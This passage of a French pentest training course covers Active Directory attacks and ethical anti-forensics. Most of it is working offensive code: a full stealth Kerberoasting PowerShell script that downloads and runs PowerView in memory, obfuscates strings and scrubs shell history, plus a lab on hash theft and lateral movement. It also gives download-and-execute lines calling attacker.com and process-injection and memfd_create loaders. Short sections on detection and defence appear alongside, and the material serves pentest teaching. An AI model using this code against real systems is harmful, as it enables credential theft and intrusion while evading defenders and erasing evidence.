   - Anomalies dans les tokens SAML
   
   **Exemple de log (Event ID 1200) :**
   ```
   Log Name:      AD FS/Admin
   Source:        AD FS
   Event ID:      1200
   Task Category: None
   Level:         Information
   Keywords:      Classic
   User:          N/A
   Computer:      ADFS.domain.com
   Description:
   The Federation Service validated a new credential.
   
   Activity ID: {1234567A-890B-1234-C567-8D901EFG2H3I}
   
   Token Type: SAML 2.0
   
   Token Issuer Name: http://adfs.domain.com/adfs/services/trust
   
   Token Issuer Thumbprint: 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t
   
   User: user@domain.com
   
   Result: Success
   
   Authentication Method: http://schemas.microsoft.com/ws/2008/06/identity/authenticationmethod/password
   
   Client IP: 192.168.1.100
   ```

3. **Logs d'événements Azure AD Connect**
   - Événements liés aux opérations de synchronisation
   - Anomalies dans les modifications synchronisées
   
   **Exemple de log (Event ID 904) :**
   ```
   Log Name:      Directory Service
   Source:        Microsoft-AzureADConnect-ProvisioningAgent
   Event ID:      904
   Task Category: None
   Level:         Information
   Keywords:      Classic
   User:          N/A
   Computer:      AADC.domain.com
   Description:
   The Provisioning Agent completed a synchronization cycle.
   
   Start Time: 2023-05-15T14:23:45.123Z
   End Time: 2023-05-15T14:24:12.456Z
   
   Objects Added: 0
   Objects Updated: 1
   Objects Deleted: 0
   
   Errors: 0
   Warnings: 0
   ```

#### Alertes SIEM typiques

**Alerte de Kerberoasting :**
```
[ALERT] Potential Kerberoasting Attack Detected
Host: DC.domain.com
Source IP: 192.168.1.100
Time: 2023-05-15 14:23:45
Details: Multiple TGS requests for service accounts detected from single source in short time period
Accounts Targeted: svc1, svc2, svc3
Encryption Types: RC4-HMAC
Severity: High
```

**Alerte de Golden Ticket :**
```
[ALERT] Potential Golden Ticket Attack Detected
Host: DC.domain.com
Source IP: 192.168.1.100
Time: 2023-05-15 14:24:12
Details: TGT with abnormal validity period detected (>10 hours)
Account: Administrator
Ticket Options: 0x40810000
Severity: Critical
```

**Alerte de DCSync :**
```
[ALERT] Potential DCSync Attack Detected
Host: DC.domain.com
Source IP: 192.168.1.100
Time: 2023-05-15 14:25:10
Details: Replication request from non-DC account
Account: DOMAIN\user
Requested Object: CN=krbtgt,CN=Users,DC=domain,DC=com
Severity: Critical
```

**Alerte de modification d'ACL suspecte :**
```
[ALERT] Suspicious ACL Modification Detected
Host: DC.domain.com
Source IP: 192.168.1.100
Time: 2023-05-15 14:26:05
Details: High-privilege ACL granted to non-administrative account
Account: DOMAIN\user
Target Object: CN=Domain Admins,CN=Users,DC=domain,DC=com
Rights Granted: GenericAll
Severity: Critical
```

**Alerte de demande de certificat suspecte :**
```
[ALERT] Suspicious Certificate Request Detected
Host: CA.domain.com
Source IP: 192.168.1.100
Time: 2023-05-15 14:27:30
Details: Certificate requested with alternate name for privileged account
Requester: DOMAIN\user
Subject Alternative Name: administrator@domain.com
Certificate Template: User
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs d'exploitation Kerberos

1. **Ciblage excessif**
   - Demande de trop nombreux tickets en peu de temps
   - Déclenchement d'alertes par comportement anormal
   
   **Solution :** Cibler sélectivement les comptes à haute valeur, espacer les demandes de tickets, utiliser des techniques plus discrètes comme la délégation.

2. **Mauvaise gestion des tickets**
   - Création de tickets avec des attributs suspects
   - Utilisation de tickets avec des durées de vie anormales
   
   **Solution :** Créer des tickets avec des attributs plausibles, utiliser des durées de vie normales, éviter les options suspectes.

3. **Négligence des protections**
   - Ignorance des mécanismes de détection comme ATA/ATP
   - Sous-estimation des capacités de monitoring
   
   **Solution :** Comprendre les mécanismes de détection en place, adapter les techniques en conséquence, privilégier les approches discrètes.

#### Erreurs d'exploitation des relations d'approbation

1. **Mauvaise compréhension des relations**
   - Confusion entre les types d'approbation
   - Tentatives d'exploitation de relations inexistantes
   
   **Solution :** Cartographier précisément les relations d'approbation, comprendre leurs types et directions, adapter les techniques en conséquence.

2. **Négligence des filtres SID**
   - Tentatives d'exploitation sans vérifier les filtres SID
   - Échec des attaques en raison des protections
   
   **Solution :** Vérifier la présence et la configuration des filtres SID, adapter les techniques en conséquence, utiliser des approches alternatives si nécessaire.

3. **Activité excessive**
   - Génération de trop nombreuses authentifications inter-domaines
   - Déclenchement d'alertes par comportement anormal
   
   **Solution :** Limiter les authentifications inter-domaines, cibler précisément les ressources nécessaires, espacer les opérations.

#### Erreurs d'exploitation des services d'infrastructure

1. **Mauvaise compréhension des services**
   - Confusion entre les rôles et fonctionnalités
   - Tentatives d'exploitation de services mal configurés
   
   **Solution :** Étudier en détail les services ciblés, comprendre leur fonctionnement et leurs vulnérabilités, adapter les techniques en conséquence.

2. **Négligence des logs spécifiques**
   - Ignorance des logs générés par les services spécifiques
   - Sous-estimation de la visibilité des actions
   
   **Solution :** Connaître les logs générés par chaque service, adapter les techniques pour minimiser les traces, nettoyer les logs si possible.

3. **Exploitation bruyante**
   - Utilisation de techniques générant de nombreuses erreurs
   - Déclenchement d'alertes par comportement anormal
   
   **Solution :** Privilégier les techniques discrètes, tester les exploits dans un environnement similaire avant de les utiliser en production, avoir un plan de repli en cas de détection.

### OPSEC Tips : Attaques AD discrètes

#### Techniques de base

1. **Limitation du bruit**
   ```powershell
   # Éviter les scans massifs
   # Au lieu de demander tous les tickets SPN
   Get-DomainUser -SPN | Get-DomainSPNTicket
   
   # Cibler spécifiquement les comptes intéressants
   Get-DomainUser -Identity "sqlservice" | Get-DomainSPNTicket
   
   # Espacer les requêtes
   # Ajouter des délais entre les requêtes pour éviter la détection
   Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
   ```

2. **Masquage des activités**
   ```powershell
   # Utiliser des outils natifs plutôt que des outils d'attaque connus
   # Au lieu de Mimikatz
   Add-Type -AssemblyName System.IdentityModel
   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/server.domain.com"
   
   # Utiliser des techniques d'obfuscation pour les scripts PowerShell
   $ScriptBlock = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64_ENCODED_SCRIPT"))
   Invoke-Expression $ScriptBlock
   ```

3. **Nettoyage des traces**
   ```powershell
   # Supprimer les tickets Kerberos après utilisation
   klist purge
   
   # Nettoyer l'historique PowerShell
   Clear-History
   Remove-Item (Get-PSReadlineOption).HistorySavePath
   
   # Supprimer les fichiers temporaires
   Remove-Item $env:TEMP\*.* -Force -Recurse
   ```

#### Techniques avancées

1. **Opérations en mémoire**
   ```powershell
   # Charger les outils directement en mémoire
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
   
   # Utiliser des techniques d'injection de processus
   # Exemple simplifié
   $bytes = [System.IO.File]::ReadAllBytes("C:\path\to\tool.exe")
   $procId = (Get-Process -Name "legitimate").Id
   # Injecter $bytes dans le processus $procId
   ```

2. **Utilisation de proxies et redirecteurs**
   ```powershell
   # Utiliser des proxies SOCKS pour masquer l'origine
   # Configurer un proxy SOCKS avec SSH
   ssh -D 1080 user@jumphost
   
   # Configurer les requêtes pour passer par le proxy
   $proxy = New-Object System.Net.WebProxy("socks5://127.0.0.1:1080")
   $webclient = New-Object System.Net.WebClient
   $webclient.Proxy = $proxy
   ```

3. **Techniques anti-forensics**
   ```powershell
   # Modifier les timestamps des fichiers
   $file = Get-Item "C:\path\to\file.txt"
   $file.LastWriteTime = "01/01/2022 00:00:00"
   $file.LastAccessTime = "01/01/2022 00:00:00"
   $file.CreationTime = "01/01/2022 00:00:00"
   
   # Utiliser des canaux cachés pour la communication
   # Exemple: DNS tunneling, ICMP tunneling, etc.
   ```

#### Script OPSEC : Kerberoasting discret

```powershell
# Script de Kerberoasting discret avec considérations OPSEC

# Configuration
$LogFile = "$env:TEMP\enum_$(Get-Date -Format 'yyyyMMddHHmmss').log"
$MaxTargets = 3  # Limiter le nombre de cibles pour réduire le bruit

# Fonction de logging
function Write-Log {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Level] $Message"
    
    # Logging local uniquement (pas de télémétrie)
    Add-Content -Path $LogFile -Value $LogEntry
    
    # Affichage console avec code couleur
    switch ($Level) {
        "INFO" { Write-Host $LogEntry -ForegroundColor Cyan }
        "SUCCESS" { Write-Host $LogEntry -ForegroundColor Green }
        "WARNING" { Write-Host $LogEntry -ForegroundColor Yellow }
        "ERROR" { Write-Host $LogEntry -ForegroundColor Red }
        default { Write-Host $LogEntry }
    }
}

# Fonction pour introduire un délai aléatoire
function Invoke-RandomDelay {
    $Delay = Get-Random -Minimum 30 -Maximum 90
    Write-Log "Waiting for $Delay seconds..." -Level "INFO"
    Start-Sleep -Seconds $Delay
}

# Fonction pour vérifier si PowerView est chargé
function Test-PowerViewLoaded {
    $Commands = @("Get-DomainUser", "Get-DomainSPNTicket")
    foreach ($Command in $Commands) {
        if (-not (Get-Command $Command -ErrorAction SilentlyContinue)) {
            return $false
        }
    }
    return $true
}

# Fonction pour charger PowerView en mémoire de manière discrète
function Load-PowerViewDiscrete {
    Write-Log "Loading PowerView in memory..." -Level "INFO"
    
    try {
        # Charger PowerView directement en mémoire
        $PowerViewUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
        $PowerViewContent = (New-Object Net.WebClient).DownloadString($PowerViewUrl)
        
        # Obfusquer certaines chaînes sensibles
        $PowerViewContent = $PowerViewContent.Replace("Invoke-Mimikatz", "Invoke-M" + (Get-Random))
        $PowerViewContent = $PowerViewContent.Replace("Get-DomainSPNTicket", "Get-DS" + (Get-Random))
        
        # Exécuter le contenu modifié
        Invoke-Expression $PowerViewContent
        
        Write-Log "PowerView loaded successfully" -Level "SUCCESS"
        return $true
    }
    catch {
        Write-Log "Failed to load PowerView: $_" -Level "ERROR"
        return $false
    }
}

# Fonction pour identifier les cibles à haute valeur
function Get-HighValueSPNTargets {
    Write-Log "Identifying high-value SPN targets..." -Level "INFO"
    
    try {
        # Rechercher les comptes de service appartenant à des groupes privilégiés
        $HighValueTargets = Get-DomainUser -SPN | Where-Object {
            $_.memberof -match "Domain Admins|Enterprise Admins|Administrators" -or
            $_.description -match "admin|service|privileged" -or
            $_.samaccountname -match "sql|exchange|sharepoint|sccm"
        } | Select-Object -First $MaxTargets
        
        if ($HighValueTargets) {
            Write-Log "Found $($HighValueTargets.Count) high-value targets" -Level "SUCCESS"
            return $HighValueTargets
        }
        else {
            Write-Log "No high-value targets found, falling back to regular SPN accounts" -Level "WARNING"
            return Get-DomainUser -SPN | Select-Object -First $MaxTargets
        }
    }
    catch {
        Write-Log "Error identifying targets: $_" -Level "ERROR"
        return $null
    }
}

# Fonction pour effectuer le Kerberoasting de manière discrète
function Invoke-DiscreteKerberoasting {
    param (
        [Parameter(Mandatory=$true)]
        [Object[]]$Targets
    )
    
    Write-Log "Starting discrete Kerberoasting..." -Level "INFO"
    $Results = @()
    
    foreach ($Target in $Targets) {
        Write-Log "Processing target: $($Target.samaccountname)" -Level "INFO"
        
        try {
            # Utiliser la méthode native .NET pour réduire la détection
            Add-Type -AssemblyName System.IdentityModel
            $SPNs = $Target.serviceprincipalname
            
            foreach ($SPN in $SPNs) {
                Write-Log "Requesting ticket for SPN: $SPN" -Level "INFO"
                
                # Introduire un délai aléatoire entre les requêtes
                Invoke-RandomDelay
                
                # Demander le ticket
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
                
                # Extraire le hash avec PowerView (si disponible)
                if (Get-Command "Get-DomainSPNTicket" -ErrorAction SilentlyContinue) {
                    $Hash = Get-DomainSPNTicket -SPN $SPN -OutputFormat Hashcat
                    $Results += $Hash
                    Write-Log "Ticket obtained for $SPN" -Level "SUCCESS"
                }
                else {
                    Write-Log "PowerView not available for hash extraction, ticket stored in memory" -Level "WARNING"
                    $Results += "Ticket for $SPN stored in memory. Use klist to view."
                }
            }
        }
        catch {
            Write-Log "Error processing target $($Target.samaccountname): $_" -Level "ERROR"
        }
    }
    
    return $Results
}

# Fonction pour nettoyer les traces
function Invoke-Cleanup {
    Write-Log "Cleaning up traces..." -Level "INFO"
    
    # Purger les tickets Kerberos
    klist purge
    Write-Log "Kerberos tickets purged" -Level "SUCCESS"
    
    # Effacer l'historique PowerShell
    try {
        Clear-History -ErrorAction SilentlyContinue
        $HistoryPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $HistoryPath) {
            $History = Get-Content $HistoryPath
            $CleanHistory = $History | Where-Object { 
                -not ($_ -match "SPN" -or $_ -match "Kerberos" -or $_ -match "Domain" -or $_ -match "ticket") 
            }
            Set-Content $HistoryPath $CleanHistory
            Write-Log "PowerShell history cleaned" -Level "SUCCESS"
        }
    } catch {
        Write-Log "Error cleaning PowerShell history: $_" -Level "ERROR"
    }
    
    # Supprimer le fichier de log après l'opération
    # Commenter cette ligne si vous souhaitez conserver le log
    # Remove-Item $LogFile -Force
}

# Fonction principale
function Invoke-Main {
    Write-Log "Starting discrete Kerberoasting operation" -Level "INFO"
    
    # Vérifier si PowerView est chargé
    if (-not (Test-PowerViewLoaded)) {
        $Success = Load-PowerViewDiscrete
        if (-not $Success) {
            Write-Log "Cannot proceed without PowerView" -Level "ERROR"
            return
        }
    }
    
    # Identifier les cibles
    $Targets = Get-HighValueSPNTargets
    if (-not $Targets) {
        Write-Log "No targets found, aborting" -Level "ERROR"
        return
    }
    
    # Effectuer le Kerberoasting
    $Results = Invoke-DiscreteKerberoasting -Targets $Targets
    
    # Sauvegarder les résultats
    if ($Results) {
        $OutputFile = "$env:TEMP\tickets_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
        $Results | Out-File -FilePath $OutputFile
        Write-Log "Results saved to $OutputFile" -Level "SUCCESS"
    }
    
    # Nettoyer les traces
    Invoke-Cleanup
    
    Write-Log "Operation completed" -Level "SUCCESS"
}

# Exécuter le script
Invoke-Main
```

### Points clés

- Les attaques avancées sur Active Directory nécessitent une compréhension approfondie des mécanismes d'authentification et d'autorisation.
- Les attaques sur Kerberos (Kerberoasting, AS-REP Roasting, délégation) permettent d'obtenir des identifiants privilégiés sans déclencher d'alertes évidentes.
- Les attaques sur les relations d'approbation permettent de compromettre plusieurs domaines ou forêts à partir d'un seul point d'entrée.
- Les services d'infrastructure comme ADCS, ADFS et Azure AD Connect offrent des vecteurs d'attaque alternatifs pour compromettre un domaine.
- Les techniques de persistance avancées permettent de maintenir l'accès même après des changements de mots de passe ou des mesures correctives.
- Les équipes défensives peuvent détecter ces attaques via les logs d'événements Kerberos, d'authentification, de réplication et de modification de sécurité.
- Une approche OPSEC discrète implique de limiter le bruit, de masquer les activités, de nettoyer les traces et d'utiliser des techniques avancées comme les opérations en mémoire.

### Mini-quiz (3 QCM)

1. **Quelle technique permet d'obtenir des hachages de mots de passe des comptes de service sans interaction directe avec ces comptes ?**
   - A) Pass-the-Hash
   - B) Kerberoasting
   - C) NTLM Relay
   - D) Credential Dumping

   *Réponse : B*

2. **Quelle attaque permet de créer un ticket Kerberos TGT valide pour n'importe quel utilisateur si l'on connaît le hash KRBTGT ?**
   - A) Silver Ticket
   - B) Diamond Ticket
   - C) Golden Ticket
   - D) Skeleton Key

   *Réponse : C*

3. **Quelle vulnérabilité d'ADCS permet d'obtenir un certificat pour un autre utilisateur en spécifiant un nom alternatif (SAN) ?**
   - A) ESC1
   - B) ESC2
   - C) ESC3
   - D) ESC8

   *Réponse : A*

### Lab/Exercice guidé : Kerberoasting et mouvement latéral discret

#### Objectif
Identifier et exploiter des comptes de service vulnérables au Kerberoasting, puis utiliser les identifiants obtenus pour effectuer un mouvement latéral, le tout en minimisant les traces et en évitant la détection.

#### Prérequis
- Un environnement Active Directory (lab ou VM)
- Un accès initial avec un compte utilisateur standard
- PowerShell avec droits d'exécution

#### Étapes

1. **Préparation et reconnaissance discrète**

```powershell
# Créer un répertoire temporaire pour les fichiers
$TempDir = "$env:TEMP\audit_$(Get-Date -Format 'yyyyMMddHHmmss')"
New-Item -ItemType Directory -Path $TempDir | Out-Null
cd $TempDir

# Charger PowerView en mémoire (sans écrire sur le disque)
$PowerViewUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
IEX (New-Object Net.WebClient).DownloadString($PowerViewUrl)

# Effectuer une reconnaissance discrète du domaine
$DomainInfo = Get-Domain
Write-Host "Domain: $($DomainInfo.Name)"

# Identifier les contrôleurs de domaine
$DCs = Get-DomainController
Write-Host "Domain Controllers: $($DCs.Count)"
$DCs | ForEach-Object { Write-Host " - $($_.Name)" }

# Identifier les comptes avec SPN (cibles potentielles pour Kerberoasting)
# Limiter le nombre de requêtes pour éviter la détection
$SPNAccounts = Get-DomainUser -SPN | Select-Object -First 5
Write-Host "SPN Accounts: $($SPNAccounts.Count)"
$SPNAccounts | ForEach-Object { Write-Host " - $($_.samaccountname)" }

# Introduire un délai pour éviter la détection
Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)
```

2. **Kerberoasting discret**

```powershell
# Fonction pour effectuer le Kerberoasting de manière discrète
function Invoke-DiscreteKerberoasting {
    param (
        [Parameter(Mandatory=$true)]
        [Object[]]$Targets
    )
    
    $Results = @()
    
    foreach ($Target in $Targets) {
        Write-Host "Processing target: $($Target.samaccountname)"
        
        try {
            # Utiliser la méthode native .NET pour réduire la détection
            Add-Type -AssemblyName System.IdentityModel
            $SPNs = $Target.serviceprincipalname
            
            foreach ($SPN in $SPNs) {
                Write-Host "Requesting ticket for SPN: $SPN"
                
                # Introduire un délai aléatoire entre les requêtes
                Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
                
                # Demander le ticket
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
                
                # Extraire le hash avec PowerView
                $Hash = Get-DomainSPNTicket -SPN $SPN -OutputFormat Hashcat
                $Results += $Hash
                Write-Host "Ticket obtained for $SPN"
            }
        }
        catch {
            Write-Host "Error processing target $($Target.samaccountname): $_"
        }
    }
    
    return $Results
}

# Sélectionner les cibles les plus prometteuses (limiter pour réduire le bruit)
$HighValueTargets = $SPNAccounts | Where-Object {
    $_.memberof -match "SQL" -or
    $_.description -match "service" -or
    $_.samaccountname -match "sql|svc"
} | Select-Object -First 2

if (-not $HighValueTargets) {
    $HighValueTargets = $SPNAccounts | Select-Object -First 2
}

Write-Host "Selected high-value targets: $($HighValueTargets.Count)"
$HighValueTargets | ForEach-Object { Write-Host " - $($_.samaccountname)" }

# Effectuer le Kerberoasting discret
$KerberoastResults = Invoke-DiscreteKerberoasting -Targets $HighValueTargets

# Sauvegarder les hashes pour le cracking hors ligne
$KerberoastResults | Out-File -FilePath "$TempDir\hashes.txt"
Write-Host "Kerberoast hashes saved to $TempDir\hashes.txt"

# Simuler le cracking des hashes (dans un environnement réel, utiliser hashcat)
Write-Host "In a real scenario, you would crack these hashes with hashcat:"
Write-Host "hashcat -m 13100 -a 0 hashes.txt wordlist.txt"

# Pour les besoins de l'exercice, supposons que nous avons craqué un mot de passe
$CrackedAccount = $HighValueTargets[0].samaccountname
$CrackedPassword = "Password123!"
Write-Host "Cracked password for $CrackedAccount: $CrackedPassword"
```

3. **Mouvement latéral discret**

```powershell
# Fonction pour effectuer un mouvement latéral discret
function Invoke-DiscreteMovement {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        
        [Parameter(Mandatory=$true)]
        [string]$Password,
        
        [Parameter(Mandatory=$true)]
        [string]$TargetServer
    )
    
    Write-Host "Attempting lateral movement to $TargetServer as $Username"
    
    # Créer un objet d'identification
    $SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecPassword)
    
    try {
        # Tester la connectivité avant de tenter la connexion
        if (Test-Connection -ComputerName $TargetServer -Count 1 -Quiet) {
            # Utiliser PowerShell Remoting pour la connexion
            $Session = New-PSSession -ComputerName $TargetServer -Credential $Credential -ErrorAction Stop
            
            if ($Session) {
                Write-Host "Successfully connected to $TargetServer"
                
                # Exécuter des commandes discrètes pour la reconnaissance
                $ComputerInfo = Invoke-Command -Session $Session -ScriptBlock {
                    $Info = @{
                        "Hostname" = $env:COMPUTERNAME
                        "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption
                        "CurrentUser" = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                        "IsAdmin" = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
                        "LocalAdmins" = (Get-LocalGroupMember -Group "Administrators" | Select-Object -ExpandProperty Name) -join ", "
                    }
                    return $Info
                }
                
                # Afficher les informations obtenues
                Write-Host "Computer Information:"
                Write-Host " - Hostname: $($ComputerInfo.Hostname)"
                Write-Host " - OS: $($ComputerInfo.OS)"
                Write-Host " - Current User: $($ComputerInfo.CurrentUser)"
                Write-Host " - Is Admin: $($ComputerInfo.IsAdmin)"
                Write-Host " - Local Admins: $($ComputerInfo.LocalAdmins)"
                
                # Fermer la session pour nettoyer
                Remove-PSSession -Session $Session
                return $ComputerInfo
            }
        }
        else {
            Write-Host "Cannot connect to $TargetServer, server may be offline or blocked by firewall"
        }
    }
    catch {
        Write-Host "Error connecting to $TargetServer: $_"
    }
    
    return $null
}

# Identifier les serveurs cibles potentiels
$TargetServers = Get-DomainComputer | Where-Object {
    $_.dnshostname -match "sql|app|web|file" -and
    $_.enabled -eq $true
} | Select-Object -ExpandProperty dnshostname -First 3

if (-not $TargetServers) {
    $TargetServers = Get-DomainComputer | Where-Object {
        $_.enabled -eq $true
    } | Select-Object -ExpandProperty dnshostname -First 3
}

Write-Host "Identified target servers: $($TargetServers.Count)"
$TargetServers | ForEach-Object { Write-Host " - $_" }

# Tenter le mouvement latéral vers chaque serveur
$SuccessfulMovements = @()
foreach ($Server in $TargetServers) {
    # Introduire un délai entre les tentatives
    Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 40)
    
    $Result = Invoke-DiscreteMovement -Username $CrackedAccount -Password $CrackedPassword -TargetServer $Server
    
    if ($Result) {
        $SuccessfulMovements += $Server
    }
}

Write-Host "Successful lateral movement to $($SuccessfulMovements.Count) servers"
$SuccessfulMovements | ForEach-Object { Write-Host " - $_" }
```

4. **Nettoyage des traces**

```powershell
# Fonction pour nettoyer les traces
function Invoke-Cleanup {
    Write-Host "Cleaning up traces..."
    
    # Purger les tickets Kerberos
    klist purge
    Write-Host "Kerberos tickets purged"
    
    # Effacer l'historique PowerShell
    Clear-History
    $HistoryPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $HistoryPath) {
        $History = Get-Content $HistoryPath
        $CleanHistory = $History | Where-Object { 
            -not ($_ -match "SPN" -or $_ -match "Kerberos" -or $_ -match "Domain" -or $_ -match "ticket" -or $_ -match "lateral") 
        }
        Set-Content $HistoryPath $CleanHistory
        Write-Host "PowerShell history cleaned"
    }
    
    # Supprimer les fichiers temporaires
    # Commenter cette ligne dans un environnement réel si vous souhaitez conserver les hashes
    # Remove-Item -Path $TempDir -Recurse -Force
    Write-Host "Temporary files would be removed in a real scenario"
    
    # Fermer toutes les sessions PowerShell distantes
    Get-PSSession | Remove-PSSession
    Write-Host "Remote PowerShell sessions closed"
}

# Exécuter le nettoyage
Invoke-Cleanup

Write-Host "Exercise completed successfully"
```

#### Vue Blue Team

1. **Détection du Kerberoasting**
   - Logs d'événements Kerberos (Event ID 4769) montrant des demandes de tickets TGS avec chiffrement RC4
   - Alertes pour des demandes multiples de tickets TGS pour des comptes de service
   - Détection de comportement anormal (demandes de tickets pour des services rarement utilisés)

2. **Détection du mouvement latéral**
   - Logs d'événements d'authentification (Event ID 4624, 4625) montrant des connexions à distance
   - Logs PowerShell Remoting (Event ID 4103, 4104) montrant l'exécution de commandes à distance
   - Alertes pour des connexions à partir de sources inhabituelles ou à des heures inhabituelles

3. **Mesures de protection**
   - Utilisation de mots de passe complexes pour les comptes de service
   - Mise en œuvre de l'authentification à deux facteurs
   - Surveillance active des événements Kerberos et des connexions à distance
   - Restriction des droits d'administration locale
   - Mise en œuvre de PAM (Privileged Access Management) pour les comptes à haute valeur

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir identifié des comptes de service vulnérables au Kerberoasting
- Avoir obtenu des hashes Kerberos pour le cracking hors ligne
- Avoir effectué un mouvement latéral vers des serveurs cibles
- Avoir collecté des informations sur les systèmes compromis
- Avoir nettoyé les traces pour minimiser la détection
- Comprendre comment ces activités peuvent être détectées par les équipes défensives
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 20 : Anti-forensics éthique

### Introduction : Pourquoi ce thème est important

L'anti-forensics, dans le contexte éthique du pentesting, ne vise pas à entraver une enquête légale, mais plutôt à simuler les techniques utilisées par des attaquants réels pour échapper à la détection et à l'analyse post-incident. Comprendre et appliquer des techniques d'anti-forensics éthiques est crucial pour l'OSCP et les engagements professionnels, car cela démontre une compréhension approfondie des traces laissées par les activités offensives et des méthodes pour les minimiser. Ce chapitre explore les techniques d'anti-forensics applicables dans un cadre éthique, en se concentrant sur la réduction de l'empreinte numérique, l'exécution en mémoire, le nettoyage raisonné et le respect des règles d'engagement. L'objectif n'est pas d'effacer illégalement des preuves, mais de rendre l'analyse forensique plus difficile pour les défenseurs, simulant ainsi un adversaire sophistiqué.

### Principes de l'anti-forensics éthique

#### Distinction entre anti-forensics éthique et illégal

1. **Objectif éthique**
   - Simuler les techniques d'évasion d'un attaquant
   - Tester la capacité de détection et de réponse de l'équipe bleue
   - Réduire l'empreinte pour éviter la détection précoce
   - Respecter les règles d'engagement et la loi

2. **Pratiques illégales (à éviter absolument)**
   - Destruction ou altération intentionnelle de preuves (spoliation)
   - Effacement des logs système critiques (Event Logs, syslog)
   - Utilisation de rootkits pour masquer des activités
   - Chiffrement de disque complet pour empêcher l'analyse
   - Toute action visant à entraver une enquête légale

3. **Cadre des règles d'engagement**
   - Définir clairement les techniques d'anti-forensics autorisées
   - Obtenir l'accord explicite du client
   - Documenter toutes les actions entreprises

#### Types d'artefacts forensiques ciblés

1. **Artefacts disque**
   - Fichiers temporaires, logs, outils téléchargés
   - Cache du navigateur, historique
   - Fichiers supprimés (espace non alloué)
   - Registre Windows, fichiers de configuration Linux

2. **Artefacts mémoire (RAM)**
   - Processus en cours d'exécution
   - Connexions réseau actives
   - Clés de chiffrement, mots de passe en clair
   - Commandes exécutées

3. **Artefacts réseau**
   - Logs de pare-feu, logs de proxy
   - Captures de paquets (PCAP)
   - NetFlow/IPFIX
   - Logs DNS

4. **Artefacts applicatifs**
   - Logs d'application spécifiques
   - Bases de données d'application
   - Fichiers de configuration d'application

### Techniques d'exécution en mémoire

#### Exécution de scripts sans écriture sur disque

1. **PowerShell (Windows)**
   - Utilisation de `IEX (New-Object Net.WebClient).DownloadString()`
   - Contournement des politiques d'exécution
   
   ```powershell
   # Télécharger et exécuter un script PowerShell en mémoire
   powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://attacker.com/script.ps1\'))"
   
   # Contournement de la politique d'exécution
   powershell.exe -ExecutionPolicy Bypass -File .\script.ps1
   powershell.exe -EncodedCommand <BASE64_ENCODED_COMMAND>
   ```

2. **Bash/Shell (Linux)**
   - Utilisation de `curl` ou `wget` avec pipe vers `bash`
   
   ```bash
   # Télécharger et exécuter un script shell en mémoire
   curl -s http://attacker.com/script.sh | bash
   wget -qO- http://attacker.com/script.sh | bash
   ```

3. **Python**
   - Utilisation de `exec()` avec du code téléchargé
   
   ```python
   # Télécharger et exécuter du code Python en mémoire
   import requests
   code = requests.get("http://attacker.com/script.py").text
   exec(code)
   ```

#### Exécution de binaires sans écriture sur disque

1. **Reflective DLL Injection (Windows)**
   - Chargement manuel d'une DLL en mémoire sans passer par le chargeur Windows
   - Techniques pour contourner les EDR
   
   ```powershell
   # Utilisation de modules PowerSploit comme Invoke-ReflectivePEInjection
   Import-Module .\PowerSploit.psd1
   Invoke-ReflectivePEInjection -PEPath C:\path\to\malicious.dll -ProcId 1234
   ```

2. **Process Hollowing (Windows)**
   - Création d'un processus légitime en état suspendu
   - Remplacement de sa mémoire par du code malveillant
   - Reprise de l'exécution du processus
   
   ```powershell
   # Utilisation de modules PowerSploit comme Invoke-ProcessHollowing
   Invoke-ProcessHollowing -ProcessPath C:\Windows\System32\notepad.exe -PayloadPath C:\path\to\malicious.exe
   ```

3. **memfd_create (Linux)**
   - Création d'un fichier anonyme en mémoire
   - Écriture du binaire dans ce fichier et exécution
   
   ```c
   // Exemple simplifié en C
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <sys/syscall.h>
   #include <sys/types.h>
   #include <fcntl.h>
   
   #ifndef __NR_memfd_create
   #define __NR_memfd_create 319
   #endif
   
   int main(int argc, char *argv[]) {
       int fd;
       pid_t pid;
       char *binary_path = "/path/to/malicious_binary";
       char *args[] = { "malicious_process", NULL };
       
       // Créer un fichier en mémoire
       fd = syscall(__NR_memfd_create, "payload", 0);
       if (fd < 0) {
           perror("memfd_create");
           return 1;
       }
       
       // Copier le binaire dans le fichier mémoire (simplifié)
       // ... code pour lire le binaire et l'écrire dans fd ...
       
       // Exécuter le binaire depuis le fichier mémoire
       pid = fork();
       if (pid == 0) {
           char path[256];
           snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
           execve(path, args, NULL);
           perror("execve");
           exit(1);
       }
       
       close(fd);
       wait(NULL);
       return 0;
   }
   ```

#### Avantages et inconvénients

